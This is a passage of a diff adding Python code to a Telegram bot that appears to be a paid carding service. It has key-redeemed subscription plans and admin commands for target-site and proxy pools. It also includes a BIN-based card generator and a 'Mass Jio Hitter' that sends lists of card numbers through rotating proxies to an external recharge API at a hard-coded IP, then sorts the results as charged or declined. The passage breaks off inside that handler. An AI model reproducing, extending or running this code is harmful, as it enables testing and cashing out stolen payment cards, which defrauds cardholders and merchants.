+            async with aiofiles.open(filename, 'w') as f:
+                await f.write(f"# ═══════════════════════════════════════════\n")
+                await f.write(f"# Generated Keys — {count} keys\n")
+                await f.write(f"# Plan: {plan_name} ({days} days)\n")
+                await f.write(f"# Max Uses: {max_uses} per key\n")
+                await f.write(f"# Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                await f.write(f"# ═══════════════════════════════════════════\n\n")
+                for k in generated:
+                    await f.write(f"{k}\n")
+
+            try:
+                await bot.send_file(
+                    event.sender_id, filename,
+                    caption=pe(f"[⌯] 𝗔𝗹𝗹 𝗞𝗲𝘆𝘀 ⌁ {count} ⌁ 🔑"),
+                    parse_mode='html'
+                )
+            except Exception as e:
+                print(f"[genkey] file send error: {e}")
+
+            try:
+                os.remove(filename)
+            except Exception:
+                pass
+
+
+@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
+async def redeem_key_command(event):
+    uid = event.sender_id
+    key = event.message.text.split(' ', 1)[1].strip() if ' ' in event.message.text else ''
+    if not key:
+        await event.reply(pe(f"🔑 Usage: /redeem [key]"), parse_mode='html')
+        return
+
+    keys = load_keys()
+    if key not in keys:
+        await event.reply(pe(f"❌ Invalid Key"), parse_mode='html')
+        return
+
+    key_data = keys[key]
+    max_uses = key_data.get("max_uses", 1)
+    usage_count = key_data.get("usage_count", 0)
+
+    if key_data.get("redeemed_by") and usage_count >= max_uses:
+        await event.reply(pe(f"❌ Key usage limit reached"), parse_mode='html')
+        return
+
+    if key_data.get("redeemed_by") and key_data.get("redeemed_by") != uid and max_uses <= 1:
+        await event.reply(pe(f"❌ Key already used"), parse_mode='html')
+        return
+
+    plan_name = key_data.get("plan", "custom")
+    days = key_data.get("days", 7)
+
+    # Use exact days — do NOT let PLAN_TYPES override
+    plan_def = {
+        "name": plan_name.replace("_", "-").title() if plan_name else f"{days}-Day",
+        "days": days,
+        "duration_label": f"{days} Days",
+    }
+
+    # Call activate_plan with EXACT days from key
+    activate_plan(uid, "key", plan_name, days, added_by=0)
+
+    keys[key]["redeemed_by"] = uid
+    keys[key]["redeemed_at"] = time.time()
+    keys[key]["usage_count"] = usage_count + 1
+    save_keys(keys)
+
+    await event.reply(pe(
+        f"[⌯] 𝗔𝗰𝗰𝗲𝘀𝘀 𝗚𝗿𝗮𝗻𝘁𝗲𝗱 ⌁ 🎉\n{SEP}\n"
+        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {days} Days ⌁ 💎\n"
+        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {format_expiry(uid)} ⌁ ⏳"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/myplan$'))
+async def my_plan_command(event):
+    uid = event.sender_id
+    p = get_plan_info(uid)
+    if not p:
+        await event.reply(pe(f"❌ No Plan\n{SEP}\nUse /redeem KEY"), parse_mode='html')
+        return
+    plan_def = PLAN_TYPES.get(p.get("plan", "weekly"), {})
+    await event.reply(pe(
+        f"[⌯] 𝗬𝗼𝘂𝗿 𝗣𝗹𝗮𝗻 ⌁ 💎\n{SEP}\n"
+        f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_def.get('name', 'Unknown')} ⭐\n"
+        f"[⌯] 𝗦𝗼𝘂𝗿𝗰𝗲 ⌁ {p.get('source', 'key').title()} 🔑\n"
+        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {format_expiry(uid)} ⏳"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/plans$'))
+async def plans_command(event):
+    uid = event.sender_id
+    text = pe(
+        f"[⌯] 𝗣𝗹𝗮𝗻𝘀 ⌁ 𝙰𝚌𝚌𝚎𝚜𝚜 𝙿𝚕𝚊𝚗𝚜 ⌁ 💎\n\n{SEP}\n"
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ 𝚄𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍 ⌁ ♾️\n{SEP}\n"
+        f"[⌯] 𝗧𝗿𝗶𝗮𝗹 ⌁ 𝙵𝚛𝚎𝚎 🎁\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹 𝙷𝚘𝚞𝚛𝚜 ⏰\n{SEP}\n"
+        f"[⌯] 𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟶 💰\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟽 𝙳𝚊𝚢𝚜 📅\n{SEP}\n"
+        f"[⌯] 𝗕𝗶-𝗪𝗲𝗲𝗸𝗹𝘆 ⌁ $𝟷𝟾 🤑\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟷𝟻 𝙳𝚊𝚢𝚜 📆\n{SEP}\n"
+        f"[⌯] 𝗠𝗼𝗻𝘁𝗵𝗹𝘆 ⌁ $𝟹𝟶 👑\n[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ 𝟹𝟶 𝙳𝚊𝚢𝚜 🗓️\n{SEP}\n"
+        f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY 🔑\n"
+        f"[⌯] 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 ⌁ @{OWNER_USERNAME} 💬"
+    )
+    await raw_send(uid, text, rows_plans())
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ ADMIN MGMT
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/ban\s+'))
+async def ban_user_command(event):
+    if not is_admin(event.sender_id):
+        return
+    try:
+        target = int(event.message.text.split(' ', 1)[1].strip())
+    except:
+        await event.reply(pe(f"❌ Usage: /ban [user_id]"), parse_mode='html')
+        return
+    ban_user(target)
+    await event.reply(pe(f"🚫 Banned <code>{target}</code>"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/unban\s+'))
+async def unban_user_command(event):
+    if not is_admin(event.sender_id):
+        return
+    try:
+        target = int(event.message.text.split(' ', 1)[1].strip())
+    except:
+        await event.reply(pe(f"❌ Usage: /unban [user_id]"), parse_mode='html')
+        return
+    unban_user(target)
+    await event.reply(pe(f"✅ Unbanned <code>{target}</code>"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/addpremium\s+'))
+async def add_premium_command(event):
+    if not is_admin(event.sender_id):
+        return
+    parts = event.message.text.split()
+    if len(parts) < 2:
+        await event.reply(pe(f"❌ Usage: /addpremium [user_id] [days]"), parse_mode='html')
+        return
+    try:
+        new_id = int(parts[1]); days = float(parts[2]) if len(parts) > 2 else 30
+    except:
+        await event.reply(pe(f"❌ Invalid format"), parse_mode='html')
+        return
+    activate_plan(new_id, "grant", "custom", days, added_by=event.sender_id)
+    await event.reply(pe(f"✅ Added <code>{new_id}</code> ⌁ {days} days"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/rmpremium\s+'))
+async def remove_premium_command(event):
+    if not is_admin(event.sender_id):
+        return
+    try:
+        rm_id = int(event.message.text.split(' ', 1)[1].strip())
+    except:
+        await event.reply(pe(f"❌ Usage: /rmpremium [user_id]"), parse_mode='html')
+        return
+    if revoke_plan(rm_id):
+        await event.reply(pe(f"✅ Removed <code>{rm_id}</code>"), parse_mode='html')
+    else:
+        await event.reply(pe(f"❌ Not found"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/users$'))
+async def list_users_command(event):
+    if not is_admin(event.sender_id):
+        return
+    users = load_premium_users()
+    if not users:
+        await event.reply(pe(f"📋 No Users"), parse_mode='html')
+        return
+    lines = []
+    for i, u in enumerate(users[:30]):
+        try:
+            uid_int = int(u)
+            p = get_plan_info(uid_int)
+            source = p.get("source", "key") if p else "key"
+            exp = format_expiry(uid_int) if p else "—"
+            lines.append(f"[⌯] {i+1} ⌁ {u} ⌁ {source} ⌁ {exp}")
+        except:
+            lines.append(f"[⌯] {i+1} ⌁ {u}")
+    more = f"\n...and {len(users)-30} more" if len(users) > 30 else ""
+    await event.reply(pe(f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {len(users)} 👥\n{SEP}\n" + "\n".join(lines) + more), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ SITE COMMANDS
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
+async def add_site_command(event):
+    if not is_admin(event.sender_id):
+        return
+    new_site = event.message.text.split(' ', 1)[1].strip()
+    if not new_site.startswith('http'):
+        await event.reply(pe(f"❌ URL must start with http"), parse_mode='html')
+        return
+    curr = load_sites()
+    if new_site in curr:
+        await event.reply(pe(f"⚠️ Already exists"), parse_mode='html')
+        return
+    async with aiofiles.open(SITES_FILE, 'a') as f:
+        await f.write(f"{new_site}\n")
+    await event.reply(pe(f"✅ Site Added\nTotal: {len(curr)+1}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
+async def remove_site_command(event):
+    if not is_admin(event.sender_id):
+        return
+    site = event.message.text.split(' ', 1)[1].strip()
+    curr = load_sites()
+    if site not in curr:
+        await event.reply(pe(f"❌ Not found"), parse_mode='html')
+        return
+    async with aiofiles.open(SITES_FILE, 'w') as f:
+        for s in curr:
+            if s != site:
+                await f.write(f"{s}\n")
+    await event.reply(pe(f"✅ Site Removed"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/sites$'))
+async def list_sites_command(event):
+    if not is_admin(event.sender_id):
+        return
+    sites = load_sites()
+    if not sites:
+        await event.reply(pe(f"🌐 No Sites"), parse_mode='html')
+        return
+    lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{s}</code>" for i, s in enumerate(sites[:30])])
+    more = f"\n...and {len(sites)-30} more" if len(sites) > 30 else ""
+    await event.reply(pe(f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(sites)} 🌐\n{SEP}\n{lines}{more}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/checksites$'))
+async def check_sites_command(event):
+    if not is_admin(event.sender_id):
+        return
+    sites = load_sites()
+    proxies = load_proxies()
+    if not sites or not proxies:
+        await event.reply(pe(f"❌ No sites/proxies"), parse_mode='html')
+        return
+    smsg = await event.reply(pe(f"🔥 Checking {len(sites)} sites..."), parse_mode='html')
+    alive, dead = [], []
+    for i in range(0, len(sites), 10):
+        batch = sites[i:i+10]
+        results = await asyncio.gather(*[test_site(s, random.choice(proxies)) for s in batch])
+        for r in results:
+            (alive if r['status'] in ('alive', 'step_error') else dead).append(r['site'])
+        await smsg.edit(pe(f"🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)} · ❌ 𝐃𝐞𝐚𝐝: {len(dead)}"), parse_mode='html')
+    async with aiofiles.open(SITES_FILE, 'w') as f:
+        for s in alive:
+            await f.write(f"{s}\n")
+    await smsg.edit(pe(f"✅ 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)}\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {len(dead)}"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ PROXY COMMANDS
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/addproxy'))
+async def add_proxy_command(event):
+    if not is_admin(event.sender_id):
+        return
+    content = event.message.text[len('/addproxy'):].strip()
+    if not content:
+        await event.reply(pe(f"📡 Usage: /addproxy ip:port"), parse_mode='html')
+        return
+    new = [l.strip() for l in content.split('\n') if l.strip()] if '\n' in content else [content.strip()]
+    curr = load_proxies()
+    added = [p for p in new if p not in curr]
+    if not added:
+        await event.reply(pe(f"⚠️ All already in pool"), parse_mode='html')
+        return
+    async with aiofiles.open(PROXY_FILE, 'a') as f:
+        for p in added:
+            await f.write(f"{p}\n")
+    await event.reply(pe(f"✅ Pool Updated\nAdded: {len(added)}\nTotal: {len(curr)+len(added)}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
+async def rm_proxy_command(event):
+    if not is_admin(event.sender_id):
+        return
+    proxy = event.message.text.split(' ', 1)[1].strip()
+    curr = load_proxies()
+    if proxy not in curr:
+        await event.reply(pe(f"❌ Not found"), parse_mode='html')
+        return
+    async with aiofiles.open(PROXY_FILE, 'w') as f:
+        for p in curr:
+            if p != proxy:
+                await f.write(f"{p}\n")
+    await event.reply(pe(f"✅ Proxy Removed"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/proxies$'))
+async def list_proxies_command(event):
+    if not is_admin(event.sender_id):
+        return
+    proxies = load_proxies()
+    if not proxies:
+        await event.reply(pe(f"📡 No Proxies"), parse_mode='html')
+        return
+    lines = "\n".join([f"[⌯] {i+1} ⌁ <code>{p}</code>" for i, p in enumerate(proxies[:20])])
+    more = f"\n...and {len(proxies)-20} more" if len(proxies) > 20 else ""
+    await event.reply(pe(f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} 📡\n{SEP}\n{lines}{more}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/checkproxies$'))
+async def check_proxies_command(event):
+    if not is_admin(event.sender_id):
+        return
+    proxies = load_proxies()
+    if not proxies:
+        await event.reply(pe(f"📡 No Proxies"), parse_mode='html')
+        return
+    smsg = await event.reply(pe(f"🔥 Checking {len(proxies)} proxies..."), parse_mode='html')
+    alive, dead = [], []
+    for i in range(0, len(proxies), 20):
+        results = await asyncio.gather(*[test_proxy(p) for p in proxies[i:i+20]])
+        for r in results:
+            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
+        await smsg.edit(pe(f"🔥 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)} · ❌ 𝐃𝐞𝐚𝐝: {len(dead)}"), parse_mode='html')
+        await asyncio.sleep(0.3)
+    async with aiofiles.open(PROXY_FILE, 'w') as f:
+        for p in alive:
+            await f.write(f"{p}\n")
+    await smsg.edit(pe(f"✅ 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞\n✅ 𝐀𝐥𝐢𝐯𝐞: {len(alive)}\n❌ 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {len(dead)}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
+async def clear_proxy_command(event):
+    if not is_admin(event.sender_id):
+        return
+    count = len(load_proxies())
+    with open(PROXY_FILE, 'w') as f:
+        f.write("")
+    await event.reply(pe(f"🗑️ Cleared {count} proxies"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
+async def get_proxy_command(event):
+    if not is_admin(event.sender_id):
+        return
+    proxies = load_proxies()
+    if not proxies:
+        await event.reply(pe(f"📡 No Proxies"), parse_mode='html')
+        return
+    filename = f"proxies_{int(time.time())}.txt"
+    async with aiofiles.open(filename, 'w') as f:
+        for p in proxies:
+            await f.write(f"{p}\n")
+    await bot.send_file(event.sender_id, filename, caption=pe(f"[⌯] 𝗣𝗼𝗼𝗹 ⌁ {len(proxies)} 📡"), parse_mode='html')
+    try:
+        os.remove(filename)
+    except:
+        pass
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ USER PROXY  (all formats supported)
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/setproxy'))
+async def set_user_proxy(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        await event.reply(pe(f"❌ Access Denied"), parse_mode='html')
+        return
+    content = event.message.text[len('/setproxy'):].strip()
+    if not content:
+        await event.reply(pe(
+            f"🔌 𝗣𝗿𝗼𝘅𝘆 𝗙𝗼𝗿𝗺𝗮𝘁𝘀\n{SEP}\n"
+            f"[⌯] ip:port ⌁ 🌐\n"
+            f"[⌯] ip:port:user:pass ⌁ 🔐\n"
+            f"[⌯] user:pass@ip:port ⌁ 🔗\n"
+            f"[⌯] http://user:pass@ip:port ⌁ 🛠️\n"
+            f"[⌯] socks5://user:pass@ip:port ⌁ 🧦"
+        ), parse_mode='html')
+        return
+    proxies = [l.strip() for l in content.split('\n') if l.strip()] if '\n' in content else [content.strip()]
+    set_user_proxies(uid, proxies)
+    await event.reply(pe(f"✅ Proxy Set\nCount: {len(proxies)}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/clearuserproxy$'))
+async def clear_user_proxy(event):
+    uid = event.sender_id
+    remove_user_proxy(uid)
+    await event.reply(pe(f"✅ Proxy Cleared"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/chkproxy'))
+async def check_user_proxy(event):
+    uid = event.sender_id
+    user_list = get_user_proxy_list(uid)
+    if not user_list:
+        await event.reply(pe(f"❌ No proxy set"), parse_mode='html')
+        return
+    proxy = user_list[0]
+    smsg = await event.reply(pe(f"⏳ Testing..."), parse_mode='html')
+    result = await test_proxy(proxy)
+    if result['status'] == 'alive':
+        ip = await get_proxy_ip(proxy)
+        await smsg.edit(pe(f"✅ 𝐀𝐥𝐢𝐯𝐞\n{SEP}\nIP: {ip or 'N/A'}"), parse_mode='html')
+    else:
+        await smsg.edit(pe(f"❌ Dead"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ MISC
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/genbin\s+'))
+async def gen_bin_command(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        return
+    parts = event.message.text.split()
+    if len(parts) < 3:
+        await event.reply(pe(f"🎴 Usage: /genbin [BIN] [count]"), parse_mode='html')
+        return
+    bin_prefix = parts[1]
+    try:
+        count = int(parts[2])
+    except:
+        count = 10
+    count = min(max(count, 1), 100)
+    cards = generate_cards_from_bin(bin_prefix, count)
+    if not cards:
+        await event.reply(pe(f"❌ Invalid BIN"), parse_mode='html')
+        return
+    filename = f"gen_{bin_prefix}_{int(time.time())}.txt"
+    async with aiofiles.open(filename, 'w') as f:
+        for card in cards:
+            await f.write(f"{card}\n")
+    await bot.send_file(event.sender_id, filename, caption=pe(f"🎴 {len(cards)} cards"), parse_mode='html')
+    os.remove(filename)
+
+
+@bot.on(events.NewMessage(pattern=r'^/bin\s+'))
+async def bin_lookup(event):
+    uid = event.sender_id
+    if not is_premium(uid):
+        return
+    bin_prefix = event.message.text.split(' ', 1)[1].strip()
+    if not bin_prefix.isdigit() or len(bin_prefix) < 6:
+        await event.reply(pe(f"❌ Invalid BIN"), parse_mode='html')
+        return
+    bin_info = await get_bin_info(bin_prefix)
+    brand, btype, level, bank, country, flag = bin_info
+    await event.reply(pe(
+        f"[⌯] 𝗕𝗜𝗡 ⌁ <code>{bin_prefix}</code> 🔍\n{SEP}\n"
+        f"[⌯] 𝗕𝗿𝗮𝗻𝗱 ⌁ {brand}\n"
+        f"[⌯] 𝗧𝘆𝗽𝗲 ⌁ {btype}\n"
+        f"[⌯] 𝗟𝗲𝘃𝗲𝗹 ⌁ {level}\n"
+        f"[⌯] 𝗕𝗮𝗻𝗸 ⌁ {bank}\n"
+        f"[⌯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⌁ {country} {flag}"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/split\s+'))
+async def split_file_command(event):
+    uid = event.sender_id
+    if not is_premium(uid) or not event.reply_to_msg_id:
+        return
+    parts = event.message.text.split()
+    try:
+        split_count = int(parts[1]) if len(parts) > 1 else 50
+    except:
+        split_count = 50
+    reply = await event.get_reply_message()
+    if not reply.file:
+        await event.reply(pe(f"❌ Reply to a file."), parse_mode='html')
+        return
+    import tempfile, uuid as _uuid
+    _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
+    os.makedirs(_tmp_dir, exist_ok=True)
+    _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
+    fp = await reply.download_media(file=_tmp_path)
+    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
+        content = await f.read()
+    try:
+        os.remove(fp)
+    except:
+        pass
+    lines = [l.strip() for l in content.splitlines() if l.strip()]
+    if not lines:
+        return
+    chunks = [lines[i:i+split_count] for i in range(0, len(lines), split_count)]
+    for idx, chunk in enumerate(chunks):
+        filename = f"split_{idx+1}_of_{len(chunks)}.txt"
+        async with aiofiles.open(filename, 'w') as f:
+            for line in chunk:
+                await f.write(f"{line}\n")
+        await bot.send_file(event.sender_id, filename, caption=pe(f"📂 {idx+1}/{len(chunks)} · {len(chunk)} lines"), parse_mode='html')
+        os.remove(filename)
+
+
+@bot.on(events.NewMessage(pattern=r'^/setlog\s+'))
+async def set_log_command(event):
+    if not is_admin(event.sender_id):
+        return
+    try:
+        group_id = int(event.message.text.split(' ', 1)[1].strip())
+    except:
+        await event.reply(pe(f"❌ Usage: /setlog [group_id]"), parse_mode='html')
+        return
+    set_log_group(group_id)
+    await event.reply(pe(f"✅ Log Group Set\n<code>{group_id}</code>"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/checklog$'))
+async def check_log_command(event):
+    if not is_admin(event.sender_id):
+        return
+    log_group = load_log_group()
+    await event.reply(pe(f"📢 Log Group\n{log_group or 'Not Set'}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/setworkers\s+'))
+async def set_workers_command(event):
+    if not is_admin(event.sender_id):
+        return
+    try:
+        count = int(event.message.text.split(' ', 1)[1].strip())
+    except:
+        await event.reply(pe(f"❌ Usage: /setworkers [count]"), parse_mode='html')
+        return
+    if count < 1 or count > 500:
+        await event.reply(pe(f"❌ Range: 1-500"), parse_mode='html')
+        return
+    config_path = 'config.py'
+    with open(config_path, 'r') as f:
+        cc = f.read()
+    cc = re.sub(
+        r'MASS_WORKERS = int\(os\.environ\.get\(.MASS_WORKERS., .\d+.\)\)',
+        f'MASS_WORKERS = int(os.environ.get("MASS_WORKERS", "{count}"))',
+        cc
+    )
+    with open(config_path, 'w') as f:
+        f.write(cc)
+    await event.reply(pe(f"✅ Workers Set ⌁ {count}\nRestart: /restart"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/setlimit\s+'))
+async def set_limit_command(event):
+    if not is_admin(event.sender_id):
+        return
+    parts = event.message.text.split()
+    if len(parts) < 3:
+        return
+    try:
+        target = int(parts[1]); limit = int(parts[2])
+    except:
+        return
+    set_user_limit(target, limit)
+    await event.reply(pe(f"✅ Limit Set\n<code>{target}</code> → {limit}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/stats$'))
+async def stats_command(event):
+    if not is_admin(event.sender_id):
+        return
+    stats = load_stats()
+    await event.reply(pe(
+        f"[⌯] 𝗦𝘁𝗮𝘁𝘀 ⌁ 📊\n{SEP}\n"
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝘀 ⌁ {stats.get('total_checks', 0):,}\n"
+        f"[⌯] 𝗛𝗶𝘁𝘀 ⌁ {stats.get('total_hits', 0):,}\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿𝘀 ⌁ {len(load_premium_users())}\n"
+        f"[⌯] 𝗦𝗶𝘁𝗲𝘀 ⌁ {len(load_sites())}\n"
+        f"[⌯] 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ⌁ {len(load_proxies())}"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
+async def broadcast_command(event):
+    if not is_admin(event.sender_id):
+        return
+    msg_text = event.message.text.split(' ', 1)[1].strip()
+    all_targets = set()
+    for u in load_premium_users():
+        try:
+            all_targets.add(int(u))
+        except:
+            pass
+    for u in ADMIN_IDS:
+        all_targets.add(u)
+    if not all_targets:
+        return
+    status_msg = await event.reply(pe(f"📢 Broadcasting to {len(all_targets)}..."), parse_mode='html')
+    sent = 0
+    failed = 0
+    for target in all_targets:
+        try:
+            await bot.send_message(target, pe(f"[⌯] 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 ⌁ 𝑹𝑿𝑷™\n{SEP}\n{msg_text}"), parse_mode='html')
+            sent += 1
+            await asyncio.sleep(0.1)
+        except:
+            failed += 1
+    await status_msg.edit(pe(f"[⌯] 𝗗𝗼𝗻𝗲 ⌁ ✅\n{SEP}\nSent: {sent}\nFailed: {failed}"), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/restart$'))
+async def restart_command(event):
+    if not is_admin(event.sender_id):
+        return
+    await event.reply(pe("🔄 Restarting..."))
+    await asyncio.sleep(1)
+    os.execl(sys.executable, sys.executable, *sys.argv)
+
+
+@bot.on(events.NewMessage(pattern=r'^/keys$'))
+async def view_keys_command(event):
+    if not is_admin(event.sender_id):
+        return
+    keys = load_keys()
+    if not keys:
+        await event.reply(pe(f"🔑 No Keys"), parse_mode='html')
+        return
+    lines = []
+    for i, (k, v) in enumerate(list(keys.items())[:20]):
+        plan = v.get("plan", "weekly")
+        used = "USED" if v.get("redeemed_by") else "NEW"
+        lines.append(f"[⌯] {i+1} ⌁ <code>{k}</code> ⌁ {plan} ⌁ {used}")
+    more = f"\n...and {len(keys)-20} more" if len(keys) > 20 else ""
+    await event.reply(pe(f"[⌯] 𝗞𝗲𝘆𝘀 ⌁ {len(keys)} 🔑\n{SEP}\n" + "\n".join(lines) + more), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/clearallkeys$'))
+async def clear_all_keys_command(event):
+    if not is_admin(event.sender_id):
+        return
+    count = clear_keys()
+    await event.reply(pe(f"🗑️ Cleared {count} keys"), parse_mode='html')
+
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ JIO HITTER
+# ══════════════════════════════════════════════════════════════════════════════
+JIO_API = os.environ.get("JIO_API", "http://31.6.62.146:8080/recharge")
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /mjio — Mass Jio Hitter (FIXED — single state handler, no double trigger)
+# ══════════════════════════════════════════════════════════════════════════════
+_JIO_MS_STATE: dict = {}   # uid → {'step', 'cards', 'file_name', 'number'}
+_JIO_MS_ACTIVE: dict = {}  # uid → live session info
+_JIO_MS_WORKERS = int(os.environ.get("JIO_WORKERS", "10"))
+
+
+def _jio_ms_pick_proxy(proxies):
+    p = random.choice(proxies).strip()
+    for prefix in ('http://', 'https://', 'socks4://', 'socks5://'):
+        if p.startswith(prefix):
+            p = p[len(prefix):]
+            break
+    if '@' in p:
+        creds, hostport = p.rsplit('@', 1)
+        if ':' in creds:
+            user, pw = creds.split(':', 1)
+            return f"{hostport}:{user}:{pw}"
+        return hostport
+    return p
+
+
+async def _jio_ms_hit(number, amount, card, proxy_param, timeout=90):
+    url = JIO_API.rstrip("/")
+    params = {"number": number, "amount": amount, "card": card, "proxy": proxy_param}
+    t0 = time.time()
+    conn = aiohttp.TCPConnector(ssl=False)
+    try:
+        async with aiohttp.ClientSession(connector=conn,
+                                         timeout=aiohttp.ClientTimeout(total=timeout)) as s:
+            async with s.get(url, params=params) as r:
+                try:
+                    data = await r.json()
+                except Exception:
+                    data = {"_raw": await r.text()}
+        return True, data, round(time.time() - t0, 2)
+    except asyncio.TimeoutError:
+        return False, {"error": "timeout"}, round(time.time() - t0, 2)
+    except Exception as e:
+        return False, {"error": str(e)[:100]}, round(time.time() - t0, 2)
+
+
+def _jio_ms_classify(data):
+    if not isinstance(data, dict):
+        return None, "ERROR", "Invalid response"
+    _ok = data.get("ok")
+    _stage = data.get("stage", "")
+    _user_msg = (data.get("user_message") or "").strip()
+    _error = (data.get("error") or "").strip()
+    _payload = data.get("payload") or {}
+    if _ok is True or (_payload and _payload.get("status") is True):
+        return "Charged", "CHARGED", _user_msg or "Recharge successful"
+    raw = (_user_msg or _error or "Unknown").lower()
+    if "proxy" in raw and ("dead" in raw or "failed" in raw):
+        return None, "PROXY", _user_msg or "Proxy dead"
+    if _stage == "ccdc_confirm" or "confirmation rejected" in raw or "rejected by gateway" in raw:
+        return None, "DECLINED", "Card declined"
+    if any(x in raw for x in ("decline", "insufficient", "invalid card", "expired", "do not honor")):
+        return None, "DECLINED", (_user_msg or _error)[:80]
+    if any(x in raw for x in ("number", "invalid number", "operator")):
+        return None, "INVALID", (_user_msg or _error)[:80]
+    return None, "FAILED", (_user_msg or _error or "Unknown")[:80]
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ /mjio — entry (reply to .txt)
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/mjio$'))
+async def mjio_cmd(event):
+    uid = event.sender_id
+
+    # Reset any pending state first
+    _JIO_MS_STATE.pop(uid, None)
+
+    if is_banned(uid):
+        return
+    if not is_premium(uid) and not is_admin(uid):
+        await event.reply(pe("❌ Premium required"), parse_mode='html')
+        return
+
+    if not event.reply_to_msg_id:
+        await event.reply(pe(
+            "[⌯] 𝗠𝗮𝘀𝘀 𝗝𝗶𝗼 𝗛𝗶𝘁𝘁𝗲𝗿 ⌁ 📱\n"
+            "─────────────────────\n"
+            "[⌯] 𝗥𝗲𝗽𝗹𝘆 ⌁ .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝗼𝗳 𝗰𝗮𝗿𝗱𝘀\n"
+            "[⌯] 𝗧𝗵𝗲𝗻 ⌁ /mjio 🚀\n"
+            "─────────────────────\n"
